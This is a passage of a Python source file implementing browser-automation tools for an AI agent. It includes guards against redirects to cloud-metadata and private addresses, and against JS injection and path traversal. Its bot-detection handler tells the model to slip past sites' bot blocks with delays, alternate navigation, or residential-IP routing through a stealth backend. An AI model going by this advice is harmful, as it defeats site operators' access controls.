        # Always-blocked floor (cloud metadata / IMDS) is enforced even
        # when auto_local_this_nav is true — see pre-nav check for
        # rationale (#16234).
        if final_url and final_url != url and is_always_blocked_url(final_url):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({"success": False, "error": "Blocked: redirect landed on a cloud metadata endpoint"})

        if not auto_local_this_nav and not _allow_private_urls() and final_url and final_url != url and not is_safe_url(final_url):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({"success": False, "error": "Blocked: redirect landed on a private/internal address"})

        response = {"success": True, "url": final_url, "title": title}
        _copy_fallback_warning(response, result)

        # Detect common "blocked" page patterns from title/url
        blocked_patterns = [
            "access denied",
            "access to this page has been denied",
            "blocked",
            "bot detected",
            "verification required",
            "please verify",
            "are you a robot",
            "captcha",
            "cloudflare",
            "ddos protection",
            "checking your browser",
            "just a moment",
            "attention required",
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Switch to the Camofox remote browser backend (set `browser.camofox.url` in "
                "Desktop settings) for residential-IP routing, "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # Tell the model which backend is active on the first navigation, so
        # it can correlate bot-detection failures with the backend choice.
        # Supported backends: local Chromium, CDP override, Camofox. No
        # residential proxy / cloud-browser provider is offered.
        if is_first_nav and "features" in session_info:
            active_features = [k for k, v in session_info["features"].items() if v]
            response["stealth_features"] = active_features

        # Auto-take a compact snapshot so the model can act immediately
        # without a separate browser_snapshot call.
        try:
            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = snapshot_text
                response["element_count"] = len(refs) if refs else 0
                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                    _copy_fallback_warning(response, snap_result)
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({"success": False, "error": result.get("error", "Navigation failed")}, ensure_ascii=False)


def browser_snapshot(full: bool = False, task_id: str | None = None, user_task: str | None = None) -> str:
    """获取当前页面可访问性树快照（紧凑或完整）；超长时结合 user_task 调用 LLM 抽取，否则按行截断。"""
    if is_camofox_mode():
        return camofox_snapshot(full, task_id, user_task)

    effective_task_id = _last_session_key(task_id or "default")

    args = []
    if not full:
        args.extend(["-c"])

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)

        response = {"success": True, "snapshot": snapshot_text, "element_count": len(refs) if refs else 0}
        _copy_fallback_warning(response, result)

        # supervisor is attached to this task. No-op otherwise. See
        # website/docs/developer-guide/browser-supervisor.md.
        try:
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_sv_snap.to_dict())
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", "Failed to get snapshot")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: str | None = None) -> str:
    """点击 snapshot 中由 ref 标识的元素；缺 @ 前缀时自动补齐。"""
    if is_camofox_mode():
        return camofox_click(ref, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        response = {"success": True, "clicked": ref}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", f"Failed to click {ref}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: str | None = None) -> str:
    """先清空再向 ref 标识的输入框写入 text；缺 @ 前缀时自动补齐。"""
    if is_camofox_mode():
        return camofox_type(ref, text, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    if result.get("success"):
        response = {"success": True, "typed": text, "element": ref}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", f"Failed to type into {ref}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_scroll(direction: str, task_id: str | None = None) -> str:
    """按 direction（up/down）滚动页面约 500 像素。"""

    if direction not in {"up", "down"}:
        return json.dumps({"success": False, "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."}, ensure_ascii=False)

    # ~500px 约为半屏高度，且 agent-browser 支持像素参数。
    _SCROLL_PIXELS = 500

    if is_camofox_mode():
        # Camofox REST API doesn't support pixel args; use repeated calls
        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = _last_session_key(task_id or "default")

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        response = {"success": False, "error": result.get("error", f"Failed to scroll {direction}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {"success": True, "scrolled": direction}
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_back(task_id: str | None = None) -> str:
    """回退到浏览器历史中的上一页。"""
    if is_camofox_mode():
        return camofox_back(task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        data = result.get("data", {})
        response = {"success": True, "url": data.get("url", "")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", "Failed to go back")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_press(key: str, task_id: str | None = None) -> str:
    """在当前页面按下指定按键（Enter / Tab / Escape / 方向键等）。"""
    if is_camofox_mode():
        return camofox_press(key, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        response = {"success": True, "pressed": key}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", f"Failed to press {key}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


# 低成本交互原语，替代过去常用的「写 JS 走 ``browser_console --expression``」黑魔法。
# ``drag`` / ``select`` 不在这里——它们得和跨 iframe 坐标、框架自定义下拉启发式搏斗，需要时直接走 ``browser_console --expression`` 派发 MouseEvent。


def _camofox_unsupported(tool_name: str) -> str:
    """为 Camofox 暂不支持的工具返回统一格式的 JSON 错误。"""
    return json.dumps({"success": False, "error": f"{tool_name} is not supported on the Camofox backend in this release."}, ensure_ascii=False)


def browser_hover(ref: str, task_id: str | None = None) -> str:
    """悬停到 ref 元素（触发 :hover / 浮层）；旧版 agent-browser 不支持 hover 命令时回退到 JS MouseEvent 派发。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_hover")

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = ref if ref.startswith("@") else f"@{ref}"
    result = _run_browser_command(effective_task_id, "hover", [normalized_ref])

    if result.get("success"):
        response = {"success": True, "hovered": normalized_ref}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    err = result.get("error", "")
    # 若 agent-browser 没有 hover 命令（旧版本会报 "unknown command"），就 fallback 到 JS 直接派发 mouseover 事件——单个 mouseover 就足以触发多数 CSS :hover 规则。
    if any(hint in err.lower() for hint in ("unknown command", "not supported", "no such command")):
        # Fallback: dispatch mouse events directly via JS. The ref lookup
        # reads the ``aria-ref`` attribute that ``agent-browser snapshot``
        # injects into each snapshotted element. If the attribute is absent
        # (element added after the last snapshot), the selector returns null
        # and the hover silently returns false. ``json.dumps`` escapes the
        # ref safely so a malicious snapshot can't break out of the
        # attribute-quoted selector.
        selector = "[aria-ref=" + json.dumps(normalized_ref[1:]) + "]"
        expression = (
            "(function(el){"
            "el.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));"
            "el.dispatchEvent(new MouseEvent('mouseenter', {bubbles: true}));"
            "return true;"
            "})(document.querySelector(" + selector + ") || null)"
        )
        eval_result = _browser_eval(expression, task_id=effective_task_id)
        try:
            parsed = json.loads(eval_result)
            if parsed.get("success"):
                response = {"success": True, "hovered": normalized_ref, "method": "js"}
                return json.dumps(response, ensure_ascii=False)
        except (json.JSONDecodeError, ValueError):
            pass
        response = {"success": False, "error": f"Failed to hover {normalized_ref}: {err}"}
        return json.dumps(response, ensure_ascii=False)

    response = {"success": False, "error": result.get("error", f"Failed to hover {normalized_ref}")}
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_wait_for(selector: str | None = None, text: str | None = None, timeout_s: float = 10.0, return_snapshot: bool = True, task_id: str | None = None) -> str:
    """轮询页面直到 selector/text 出现（或超时）；命中后可附带紧凑快照。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_wait_for")

    if not selector and not text:
        return json.dumps({"success": False, "error": "At least one of `selector` or `text` must be provided."}, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    deadline = time.monotonic() + max(0.1, timeout_s)
    poll_interval = 0.2
    last_match = None

    # getBoundingClientRect 用于过滤 DOM 中存在但视觉上不可见（零尺寸）的元素。
    js_selector = ""
    if selector:
        js_selector = (
            "const s = document.querySelector(" + json.dumps(selector) + ");"
            "if (s && s.getBoundingClientRect().width > 0 && s.getBoundingClientRect().height > 0) {"
            "  return {tag: s.tagName, id: s.id || null, text: (s.textContent || '').trim().slice(0, 120)};"
            "}"
        )
    js_text = ""
    if text:
        js_text = (
            "const t = " + json.dumps(text) + ".toLowerCase();"
            "const all = document.querySelectorAll('body *');"
            "for (const el of all) {"
            "  if ((el.textContent || '').toLowerCase().includes(t)"
            "      && el.children.length < 50"
            "      && el.getBoundingClientRect().width > 0) {"
            "    return {tag: el.tagName, id: el.id || null, text: (el.textContent || '').trim().slice(0, 120)};"
            "  }"
            "}"
        )
    expression = "(function(){" + js_selector + js_text + "return null;})()"

    start = time.monotonic()
    while time.monotonic() < deadline:
        eval_result = _browser_eval(expression, task_id=effective_task_id)
        try:
            parsed = json.loads(eval_result)
        except (json.JSONDecodeError, ValueError):
            parsed = {}
        if parsed.get("success") and parsed.get("result") is not None:
            last_match = parsed.get("result")
            break
        # JS exception / supervisor down — the user needs to know rather than
        # silently retrying until timeout.
        if parsed.get("success") is False and parsed.get("error"):
            return json.dumps({"success": False, "error": f"wait_for probe failed: {parsed['error']}", "elapsed_ms": int((time.monotonic() - start) * 1000)}, ensure_ascii=False)
        time.sleep(poll_interval)

    elapsed_ms = int((time.monotonic() - start) * 1000)

    if last_match is None:
        return json.dumps(
            {
                "success": False,
                "matched": False,
                "error": (f"Timed out after {timeout_s:.1f}s waiting for " + (f"selector {selector!r}" if selector else f"text {text!r}")),
                "elapsed_ms": elapsed_ms,
            },
            ensure_ascii=False,
        )

    response = {"success": True, "matched": True, "match": last_match, "elapsed_ms": elapsed_ms}
    if return_snapshot:
        snap_json = browser_snapshot(full=False, task_id=task_id)
        try:
            snap_parsed = json.loads(snap_json)
            if snap_parsed.get("snapshot") is not None:
                response["snapshot"] = snap_parsed["snapshot"]
                response["element_count"] = snap_parsed.get("element_count", 0)
        except (json.JSONDecodeError, ValueError, TypeError):
            pass
    return json.dumps(response, ensure_ascii=False)


def browser_find(query: str, ref_only: bool = True, task_id: str | None = None) -> str:
    """在实时 DOM 中按文本子串搜索匹配元素，返回它们的 snapshot ref（避免快照过期问题）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_find")

    if not query or not query.strip():
        return json.dumps({"success": False, "error": "`query` must be a non-empty string."}, ensure_ascii=False)

    # DOM walk 遍历交互/可聚焦元素，最多返回 _FIND_CAP 个匹配项（可见矩形 + 文本命中）。refs 来自最近一次 snapshot——会重度修改 DOM 的调用方最好在 ``browser_find`` 后再 ``browser_snapshot`` 刷一下。
    effective_task_id = _last_session_key(task_id or "default")
    js = (
        "(function(){const q = " + json.dumps(query.lower()) + ";"
        "const out = [];"
        "const all = document.querySelectorAll('a, button, input, h1, h2, h3, h4, li, td, [role=\"button\"]');"
        f"for (const el of all) {{ if (out.length >= {_FIND_CAP}) break;"
        "  const t = (el.textContent || el.value || '').toLowerCase();"
        "  if (!t || !t.includes(q)) continue;"
        "  const r = el.getBoundingClientRect();"
        "  if (r.width === 0 || r.height === 0) continue;"
        "  out.push({tag: el.tagName.toLowerCase(), text: t.slice(0, 120),"
        "            textOriginal: (el.textContent || el.value || '').trim().slice(0, 120),"
        "            ariaRef: el.getAttribute('aria-ref') || null});"
        "}}"
        "return out;})()"
    )

    eval_result = _browser_eval(js, task_id=effective_task_id)
    try:
        parsed = json.loads(eval_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_find: failed to parse JS probe result"}, ensure_ascii=False)

    if not parsed.get("success"):
        return json.dumps(parsed, ensure_ascii=False)

    raw_matches = parsed.get("result") or []
    if not isinstance(raw_matches, list):
        return json.dumps({"success": False, "error": f"browser_find: unexpected probe result type {type(raw_matches).__name__}"}, ensure_ascii=False)

    matches = []
    for entry in raw_matches:
        if not isinstance(entry, dict):
            continue
        aria_ref = entry.get("ariaRef")
        ref = f"@{aria_ref}" if aria_ref else None
        if ref_only:
            if ref:
                matches.append(ref)
        else:
            matches.append({"tag": entry.get("tag"), "text": entry.get("textOriginal"), "ref": ref})

    return json.dumps({"success": True, "count": len(matches), "matches": matches}, ensure_ascii=False)


def _cdp_mouse(supervisor, event_type: str, x: float, y: float, button: str = "left", click_count: int = 0) -> dict:
    """通过 supervisor 派发一次 CDP Input.dispatchMouseEvent。"""
    return supervisor.send_cdp("Input.dispatchMouseEvent", {"type": event_type, "x": x, "y": y, "button": button, "clickCount": click_count})


def _cdp_key(supervisor, event_type: str, key: str) -> dict:
    """通过 supervisor 派发一次 CDP Input.dispatchKeyEvent。"""
    return supervisor.send_cdp("Input.dispatchKeyEvent", {"type": event_type, "key": key})


def browser_drag(from_ref: str, to_ref: str, hold_key: str | None = None, task_id: str | None = None) -> str:
    """把 from_ref 拖到 to_ref（CDP mouse 事件序列；无 supervisor 时回退到 JS MouseEvent 派发）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_drag")

    valid_keys = {None, "shift", "ctrl", "alt"}
    if hold_key not in valid_keys:
        return json.dumps({"success": False, "error": f"hold_key must be one of {sorted(k for k in valid_keys if k)}, got {hold_key!r}"}, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    from_norm = from_ref if from_ref.startswith("@") else f"@{from_ref}"
    to_norm = to_ref if to_ref.startswith("@") else f"@{to_ref}"

    # Step 1: 通过 _browser_eval 拿到边界矩形（有/无 supervisor 都会自动走 fast-path）。``json.dumps`` 确保 ref 被属性引用安全包裹，防止恶意 ref 逃逸到可执行 JS。
    from_id = json.dumps(from_norm[1:])
    to_id = json.dumps(to_norm[1:])
    rect_js = (
        "(function(){"
        f"const f=document.querySelector('[aria-ref='+{from_id}+']');"
        f"const t=document.querySelector('[aria-ref='+{to_id}+']');"
        "if(!f||!t)return null;"
        "const fr=f.getBoundingClientRect();"
        "const tr=t.getBoundingClientRect();"
        "if(!fr.width||!fr.height||!tr.width||!tr.height)return null;"
        "return {fx:fr.left+fr.width/2,fy:fr.top+fr.height/2,"
        "tx:tr.left+tr.width/2,ty:tr.top+tr.height/2};"
        "})()"
    )
    rect_result = _browser_eval(rect_js, task_id=effective_task_id)
    try:
        rect_parsed = json.loads(rect_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_drag: failed to resolve element positions"}, ensure_ascii=False)
    if not rect_parsed.get("success") or rect_parsed.get("result") is None:
        return json.dumps(
            {"success": False, "error": f"browser_drag: could not locate one or both elements ({from_norm} → {to_norm}). Run browser_snapshot first to refresh refs."},
            ensure_ascii=False,
        )

    coords = rect_parsed["result"]
    fx, fy = coords["fx"], coords["fy"]
    tx, ty = coords["tx"], coords["ty"]

    # Step 2: 经 supervisor 派发 CDP Input 事件。
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        # No CDP supervisor — fall back to JS synthetic events.
        return _browser_drag_js(from_norm, to_norm, fx, fy, tx, ty, hold_key, task_id)

    steps = max(1, int(math.hypot(tx - fx, ty - fy) / 10))
    try:
        if hold_key:
            _cdp_key(supervisor, "keyDown", hold_key)
        _cdp_mouse(supervisor, "mousePressed", fx, fy, click_count=1)
        for i in range(1, steps + 1):
            mx = fx + (tx - fx) * i / steps
            my = fy + (ty - fy) * i / steps
            _cdp_mouse(supervisor, "mouseMoved", mx, my)
        _cdp_mouse(supervisor, "mouseReleased", tx, ty, click_count=1)
        if hold_key:
            _cdp_key(supervisor, "keyUp", hold_key)
    except Exception as exc:
        return json.dumps({"success": False, "error": f"CDP input dispatch failed: {exc}"}, ensure_ascii=False)

    return json.dumps({"success": True, "from": from_norm, "to": to_norm, "steps": steps, "method": "cdp"}, ensure_ascii=False)


def _browser_drag_js(from_ref: str, to_ref: str, fx: float, fy: float, tx: float, ty: float, hold_key: str | None, task_id: str | None) -> str:
    """无 CDP supervisor 时通过 JS MouseEvent 序列模拟拖拽的降级实现。"""
    modifier_js = ""
    if hold_key:
        # ``json.dumps`` produces a JSON string literal; a JSON string is also
        # a valid JS string literal (both delimiters are ``"``), so it can
        # be inlined into the JS source as-is. ``shift`` / ``ctrl`` / ``alt``
        # are ASCII-safe by construction but we use the JSON encoder anyway
        # so arbitrary inputs can't break out of the key string.
        modifier_js = f"window.dispatchEvent(new KeyboardEvent('keydown',{{key:{json.dumps(hold_key)}}}));"

    js = (
        "(function(fx,fy,tx,ty){" + modifier_js + "const m=(t,x,y)=>new MouseEvent(t,{clientX:x,clientY:y,bubbles:true,button:0});"
        # Look up source/target at the actual drop point, not at the start
        # point — `document.elementFromPoint(tx, ty)` returns the live
        # element under the cursor after each mousemove, which is what
        # drag-and-drop libraries expect.
        "const src=document.elementFromPoint(fx,fy);"
        "if(!src)return false;"
        "src.dispatchEvent(m('mousedown',fx,fy));"
        "for(let i=1;i<=5;i++){"
        "  const ix=fx+(tx-fx)*i/5, iy=fy+(ty-fy)*i/5;"
        "  document.dispatchEvent(m('mousemove',ix,iy));"
        "  const tgt=document.elementFromPoint(ix,iy);"
        "  if(tgt){tgt.dispatchEvent(m('mouseover',ix,iy));tgt.dispatchEvent(m('mouseenter',ix,iy));}"
        "}"
        "const dropTgt=document.elementFromPoint(tx,ty);"
        "if(dropTgt)dropTgt.dispatchEvent(m('mouseup',tx,ty));"
        "src.dispatchEvent(m('mouseup',tx,ty));"
        "return true;"
        f"}})({fx},{fy},{tx},{ty})"
    )
    effective_task_id = task_id or "default"
    eval_result = _browser_eval(js, task_id=effective_task_id)
    try:
        parsed = json.loads(eval_result)
        if parsed.get("success") and parsed.get("result"):
            return json.dumps({"success": True, "from": from_ref, "to": to_ref, "steps": 5, "method": "js"}, ensure_ascii=False)
    except (json.JSONDecodeError, ValueError):
        pass
    return json.dumps({"success": False, "error": f"browser_drag: JS fallback failed for {from_ref} → {to_ref}"}, ensure_ascii=False)


def browser_select(ref: str, value: str | None = None, label: str | None = None, index: int | None = None, open_delay_s: float = 0.5, task_id: str | None = None) -> str:
    """在 ``<select>`` 或常见自定义下拉（Ant Design / Element UI / MUI / React Select 等）中按 value/label/index 选中目标项。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_select")

    if value is None and label is None and index is None:
        return json.dumps({"success": False, "error": "At least one of `value`, `label`, or `index` must be provided."}, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = ref if ref.startswith("@") else f"@{ref}"
    ref_id = normalized_ref[1:]

    if value is not None:
        value_str = str(value)
        match_js = f"if(o.value==={json.dumps(value_str)}||o.textContent.trim()==={json.dumps(value_str)})o.selected=true;"
    elif label is not None:
        match_js = f"if((o.textContent||'').toLowerCase().includes({json.dumps(label.lower())}))o.selected=true;"
    else:
        match_js = f"if(i==={index})o.selected=true;"

    # ``json.dumps`` 转义 ``ref_id``，避免 LLM 给的 ref 逃逸出属性引用 selector 注入任意 JS。
    safe_ref = json.dumps(ref_id)
    select_js = (
        "(function(){"
        f"const el=document.querySelector('[aria-ref=' + {safe_ref} + ']');"
        "if(!el)return{_:'not_found'};"
        "if(el.tagName==='SELECT'){"
        "const opts=Array.from(el.options);"
        "for(let i=0;i<opts.length;i++){const o=opts[i];" + match_js + "}"
        "el.dispatchEvent(new Event('change',{bubbles:true}));"
        "return{_:'native',value:el.value,text:el.options[el.selectedIndex]?.text||''};"
        "}"
        # Custom dropdown — click to open, then find the option.
        "el.click();"
        "return{_:'clicked'};"
        "})()"
    )
    eval_result = _browser_eval(select_js, task_id=effective_task_id)
    try:
        parsed = json.loads(eval_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_select: failed to parse JS result"}, ensure_ascii=False)

    if not parsed.get("success"):
        return json.dumps(parsed, ensure_ascii=False)

    result = parsed.get("result", {})
    if isinstance(result, dict) and result.get("_") == "native":
        return json.dumps({"success": True, "selected": result.get("value"), "text": result.get("text"), "method": "native"}, ensure_ascii=False)
    if isinstance(result, dict) and result.get("_") == "not_found":
        return json.dumps({"success": False, "error": f"browser_select: element {normalized_ref} not found. Run browser_snapshot first."}, ensure_ascii=False)

    # 自定义下拉已点击，等待动画完成后按可见文本搜索匹配项。
    time.sleep(min(0.5, open_delay_s))
    label_query = label or value or ""
    kb_js = (
        "(function(){"
        'const opts=document.querySelectorAll(\'[role="option"], [class*="option"], [class*="item"], li\');'
        "const q=" + json.dumps(label_query.lower()) + ";"
        "for(const o of opts){"
        "if((o.textContent||'').toLowerCase().includes(q)&&o.getBoundingClientRect().width>0){"
        "o.click();return{_:'custom',text:o.textContent.trim()};}}"
        "return{_:'no_match'};"
        "})()"
    )
    kb_result = _browser_eval(kb_js, task_id=effective_task_id)
    try:
        kb_parsed = json.loads(kb_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_select: failed to parse custom dropdown result"}, ensure_ascii=False)

    if kb_parsed.get("success") and isinstance(kb_parsed.get("result"), dict):
        inner = kb_parsed["result"]
        if inner.get("_") == "custom":
            return json.dumps({"success": True, "text": inner.get("text"), "method": "custom_click"}, ensure_ascii=False)

    return json.dumps(
        {
            "success": False,
            "error": (
                f"browser_select: could not select option in {normalized_ref}. "
                "The element may be a non-standard dropdown — try browser_console --expression to interact with it directly."
            ),
        },
        ensure_ascii=False,
    )


def _safe_save_name(save_as: str | None, default: str) -> str:
    """仅保留 save_as 的 basename（防 LLM 用绝对路径或 ``..`` 越界写入缓存目录外）。"""
    name = Path(save_as or "").name
    return name or default


def _unlink_files_older_than(paths: Iterable[Path] | Any, cutoff_s: float) -> None:
    """删除所有 mtime 早于 cutoff_s 的文件，错误只记录不抛。"""
    for p in paths:
        try:
            if p.is_file() and p.stat().st_mtime < cutoff_s:
                p.unlink()
        except Exception as e:
            logger.debug("Failed to clean old file %s: %s", p, e)


def _get_downloads_dir() -> Path:
    """返回（并按需创建）浏览器下载缓存目录。"""
    d = get_spiritagent_dir("cache/downloads", "browser_downloads")
    d.mkdir(parents=True, exist_ok=True)
    return d


def _cleanup_old_downloads(max_age_hours: int = 24) -> None:
    """删除超过 max_age_hours 的下载文件；每小时至多跑一次以避免反复扫描。"""
    global _LAST_DOWNLOAD_CLEANUP
    now = time.time()
    if now - _LAST_DOWNLOAD_CLEANUP < 3600:
        return
    _LAST_DOWNLOAD_CLEANUP = now
    _unlink_files_older_than(_get_downloads_dir().iterdir(), now - max_age_hours * 3600)


def _download_ok(file_path: Path, filename: str | None = None) -> str:
    """为已完成的下载生成统一的成功 JSON。"""
    return json.dumps({"success": True, "path": str(file_path), "filename": filename or file_path.name, "size_bytes": file_path.stat().st_size}, ensure_ascii=False)


def browser_download(ref_or_url: str, save_as: str | None = None, timeout_s: float = 30.0, task_id: str | None = None) -> str:
    """通过点击 snapshot 引用或直跳 URL 触发下载，阻塞至拿到文件（需 CDP 后端；无 supervisor 时轮询下载目录）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_download")
    if ref_or_url and ref_or_url.startswith(("http://", "https://")) and not is_safe_url(ref_or_url):
        return json.dumps({"success": False, "error": f"URL rejected by security policy: {ref_or_url}"}, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    downloads_dir = _get_downloads_dir()
    _cleanup_old_downloads()

    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is not None:
        dest = str(downloads_dir)
        supervisor.send_cdp("Browser.setDownloadBehavior", {"behavior": "allow", "eventsEnabled": True, "downloadPath": dest})

    is_ref = ref_or_url.startswith("@") or (ref_or_url.startswith("e") and ref_or_url[1:].isdigit())
    if is_ref:
        normalized_ref = ref_or_url if ref_or_url.startswith("@") else f"@{ref_or_url}"
        trigger_result = _run_browser_command(effective_task_id, "click", [normalized_ref])
        action = "click"
    else:
        trigger_result = _run_browser_command(effective_task_id, "open", [ref_or_url])
        action = "navigate"
    if not trigger_result.get("success"):
        return json.dumps({"success": False, "error": f"browser_download: {action} failed: {trigger_result.get('error', 'unknown')}"}, ensure_ascii=False)
    if action == "navigate" and trigger_result.get("data", {}).get("url"):
        final_url = trigger_result["data"]["url"]
        if final_url != ref_or_url and not check_redirect_url_safety(ref_or_url, final_url):
            return json.dumps({"success": False, "error": f"browser_download: redirect to unsafe URL blocked: {final_url}"}, ensure_ascii=False)

    if supervisor is not None:
        dl_result = supervisor.wait_for_download(timeout=timeout_s)
        if dl_result.get("ok"):
            filename = _safe_save_name(save_as, dl_result.get("filename", "download"))
            file_path = downloads_dir / filename
            if file_path.exists():
                return _download_ok(file_path, filename)
            # File may have a different name — fall back to most recent.
            candidates = sorted(downloads_dir.iterdir(), key=lambda f: f.stat().st_mtime, reverse=True)
            if candidates:
                return _download_ok(candidates[0])
            return json.dumps({"success": False, "error": "browser_download: download reported complete but file not found in downloads dir"}, ensure_ascii=False)
        return json.dumps({"success": False, "error": f"browser_download: {dl_result.get('error', 'download failed')}"}, ensure_ascii=False)

    deadline = time.monotonic() + max(1.0, timeout_s)
    before = {f.name for f in downloads_dir.iterdir()}
    while time.monotonic() < deadline:
        time.sleep(0.5)
        new_files = [f for f in downloads_dir.iterdir() if f.name not in before and not f.name.endswith(".crdownload")]
        if new_files:
            return _download_ok(max(new_files, key=lambda f: f.stat().st_mtime))
    return json.dumps({"success": False, "error": f"browser_download: no download detected after {timeout_s}s"}, ensure_ascii=False)


def browser_pdf(
    save_as: str | None = None,
    landscape: bool = False,
    print_background: bool = True,
    paper_width: float = 8.5,
    paper_height: float = 11.0,
    task_id: str | None = None,
) -> str:
    """把当前页面保存为 PDF（CDP Page.printToPDF，需 CDP 后端）；返回路径、页数、SHA-256。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_pdf")

    effective_task_id = _last_session_key(task_id or "default")
    downloads_dir = _get_downloads_dir()
    _cleanup_old_downloads()

    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return json.dumps({"success": False, "error": "browser_pdf requires a CDP-capable backend (local Chrome or CDP override)"}, ensure_ascii=False)

    cdp_result = supervisor.send_cdp(
        "Page.printToPDF",
        {"landscape": landscape, "printBackground": print_background, "paperWidth": paper_width, "paperHeight": paper_height, "transferMode": "ReturnAsBase64"},
    )
    if not cdp_result.get("ok"):
        return json.dumps({"success": False, "error": f"browser_pdf: CDP error: {cdp_result.get('error', 'unknown')}"}, ensure_ascii=False)

    result_data = cdp_result.get("result", {})
    pdf_b64 = result_data.get("data")
    if not pdf_b64:
        return json.dumps({"success": False, "error": "browser_pdf: CDP returned empty PDF data"}, ensure_ascii=False)

    pdf_bytes = base64.b64decode(pdf_b64)
    filename = _safe_save_name(save_as, f"page_{uuid.uuid4().hex[:8]}.pdf")
    file_path = downloads_dir / filename
    file_path.write_bytes(pdf_bytes)
    # 用 ``/Type /Page`` 标记数页数（Page.printToPDF 不返回页数）；负向预查排除 ``/Type /Pages`` 目录项。
    pages = len(re.findall(rb"/Type\s*/Page(?!s)", pdf_bytes))

    return json.dumps(
        {"success": True, "path": str(file_path), "filename": filename, "pages": pages, "size_bytes": len(pdf_bytes), "sha256": hashlib.sha256(pdf_bytes).hexdigest()},
        ensure_ascii=False,
    )


def browser_screenshot_element(ref: str, save_as: str | None = None, task_id: str | None = None) -> str:
    """对 ref 元素截图（按 getBoundingClientRect + CDP clip，需 CDP 后端；CSS transform 不被纳入）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_screenshot_element")

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = ref if ref.startswith("@") else f"@{ref}"
    ref_id = normalized_ref[1:]

